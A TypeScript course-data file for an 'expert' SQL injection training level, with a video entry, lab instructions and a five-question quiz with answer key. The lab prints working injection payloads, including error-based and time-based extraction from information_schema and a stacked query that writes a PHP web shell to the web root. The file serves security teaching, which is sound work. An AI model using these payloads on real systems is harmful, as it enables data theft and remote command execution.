import { CourseModule } from '../../../types/course';

export const sqlInjectionLevel3Modules: CourseModule[] = [
  {
    id: 'sql-level3-intro',
    title: 'Level 3: Expert SQL Injection & Defense',
    duration: '2.5h',
    type: 'video',
    status: 'available',
    description: 'Master expert-level SQL injection techniques and comprehensive defense strategies.',
    videoUrl: 'https://example.com/videos/expert-sql-injection',
  },
  {
    id: 'sql-level3-lab',
    title: 'Expert SQL Injection Lab',
    duration: '4h',
    type: 'lab',
    status: 'available',
    description: 'Practice advanced exploitation and defense techniques in complex scenarios.',
    labInstructions: `
Expert SQL Injection Laboratory

1. Advanced Attack Vectors:
   - Polyglot SQL injection
   - Filter bypass techniques
   - Database-specific attacks
   - ORM injection scenarios

2. Expert Techniques:
   \`\`\`sql
   -- Advanced error-based extraction
   ' AND UPDATEXML(1,CONCAT('~',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),'~'),1)--
   
   -- Advanced time-based extraction with conditional logic
   ' AND IF(SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),1,1)='a',SLEEP(5),0)--
   
   -- Advanced stacked queries with temp tables
   '; CREATE TEMPORARY TABLE tmp SELECT '<?php system($_GET[1])?>' INTO OUTFILE '/var/www/shell.php'--
   \`\`\`

3. WAF Bypass Techniques:
   - Character encoding tricks
   - Alternative syntax usage
   - Comment variants
   - Case manipulation

4. Defense Implementation:
   - WAF rule creation
   - Runtime RASP implementation
   - Custom input validation
   - Monitoring and alerting

5. Advanced Scenarios:
   - NoSQL injection correlation
   - GraphQL injection
   - API endpoint exploitation
   - Stored procedure abuse
    `,
  },
  {
    id: 'sql-level3-quiz',
    title: 'Expert SQL Injection Assessment',
    duration: '1.5h',
    type: 'quiz',
    status: 'available',
    description: 'Validate your expert-level knowledge of SQL injection.',
    questions: [
      {
        question: 'Which technique can be used to bypass WAF restrictions on single quotes?',
        options: [
          'Using char() function concatenation',
          'Adding more quotes',
          'Using double quotes instead',
          'Removing quotes entirely',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is a SQL injection polyglot?',
        options: [
          'A payload that works across multiple database types',
          'A multi-line SQL query',
          'A stored procedure call',
          'A type of prepared statement',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which defense mechanism is most effective against SQL injection?',
        options: [
          'Parameterized queries with input validation',
          'Simple input escaping',
          'Removing error messages',
          'Using custom encoding',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is the purpose of RASP in SQL injection defense?',
        options: [
          'Runtime detection and prevention of attacks',
          'Database encryption',
          'Network filtering',
          'Code obfuscation',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which technique is most effective for extracting large amounts of data through blind SQL injection?',
        options: [
          'Binary search algorithm with conditional queries',
          'Multiple UNION SELECT statements',
          'ERROR-based extraction',
          'Direct SELECT queries',
        ],
        correctAnswer: 0,
      },
    ],
  },
];